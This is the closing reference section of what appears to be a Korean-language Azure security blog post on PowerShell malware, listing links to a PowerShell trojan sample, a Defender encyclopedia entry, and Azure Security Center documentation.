   <li><a href="https://twitter.com/Lee_Holmes/status/922462821081694208" title="https://twitter.com/Lee_Holmes/status/922462821081694208">https://twitter.com/Lee_Holmes/status/922462821081694208</a></li>
   <li><a href="https://blogs.msdn.microsoft.com/powershell/2017/10/23/defending-against-powershell-attacks/" title="https://blogs.msdn.microsoft.com/powershell/2017/10/23/defending-against-powershell-attacks/">https://blogs.msdn.microsoft.com/powershell/2017/10/23/defending-against-powershell-attacks/</a></li>
  </ul>


  <p>악성 스크립트 및 해당 출력에 대한 자세한 내용은 다음을 참조하세요.</p>


  <ul>
   <li><a href="https://pastebin.com/7wyupkjl">가장 흥미로운 PowerShell 트로이 목마 [PowerShell 샘플 및 원시 붙여넣기 데이터 제공 @JohnLaTwC]</a></li>
   <li><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Spyware%3aPowerShell%2fTripelog">Windows Defender 맬웨어 백과사전 항목: Spyware:PowerShell/Tripelog</a></li>
  </ul>


  <p>Azure Security Center에 대한 자세한 내용은 다음을 참조하세요.</p>


  <ul>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-detection-capabilities">Azure Security Centers&rsquo; 검색 기능</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-managing-and-responding-alerts">Azure Security Center에서 보안 경고 관리 및 대응</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-recommendations">Azure Security Center에서 보안 권장 사항 관리</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-monitoring">Azure Security Center에서 보안 상태 모니터링</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-partner-solutions">Azure Security Center를 사용하여 파트너 솔루션 모니터링</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-faq">Azure Security Center FAQ</a></li>
   <li>Azure Security 블로그를 읽어 최신 <a href="https://blogs.msdn.com/b/azuresecurity/">Azure 보안</a> 뉴스 및 정보를 가져옵니다.</li>
  </ul>
